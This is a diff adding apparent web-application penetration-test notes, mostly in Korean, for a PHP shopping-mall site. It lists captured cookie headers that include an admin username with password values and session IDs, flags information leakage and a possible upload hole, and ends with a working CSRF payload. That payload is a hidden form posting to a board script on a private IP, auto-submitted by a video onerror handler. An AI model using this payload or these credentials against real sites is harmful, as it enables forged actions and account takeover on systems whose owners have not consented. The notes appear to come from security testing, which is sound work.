@@ -1,0 +1,43 @@
+/skin/morning_blue_mall_login2/image/back_003.gif
+
+/shop_image/2011040522452452_1.jpg
+
+/admin/images/menu_back.gif
+
+Content-Type: image/jpeg
+
+관리자
+
+
+사용자
+Cookie: PHPSESSID=5b1144348024434a9fa0d6f2ec6da384
+Cookie: PHPSESSID=483ba7d77f8a86d32123e43f8f84a099
+
+관리자
+Cookie: SEO_USER_ID=coreadmin; SEO_USER_PWD=movmaNwCJkl8s; PHPSESSID=00934be66ae2fed5214444982017e366
+
+Cookie: SEO_USER_ID=coreadmin; PHPSESSID=00934be66ae2fed5214444982017e366; SEO_USER_PWD=mo7sLvDuVNZJ2
+
+--- 정보 누출
+* 
+
+--- 업로드 가능
+m_write.ph
+
+
+--- csrf
+CSRF
+ <iframe style="display:none" name="csrf-frame"></iframe>
+ <form method='POST' action='http://70.12.113.49:81/m_board_ok.php' target="csrf-frame" id="csrf-frame">
+ <input type="hidden" name="ps_mode" value="write"/>
+ <input type="hidden" name="ps_db" value="freeboard"/>
+ <input type="hidden" name="ps_page" value="1"/>
+ <input type="hidden" name="board_name" value="test"/>
+ <input type="hidden" name="board_category" value="1"/>
+ <input type="hidden" name="use_html" value="1"/>
+ <input type="hidden" name="board_subject" value="CSRF"/>
+ <input type="hidden" name="board_body" value="CSRF성공"/>
+ <input type="hidden" name="x" value="55"/>
+ <input type="hidden" name="y" value="25"/>
+ </form>
+<video src="1" onerror=document.getElementById("csrf-frame").submit()>
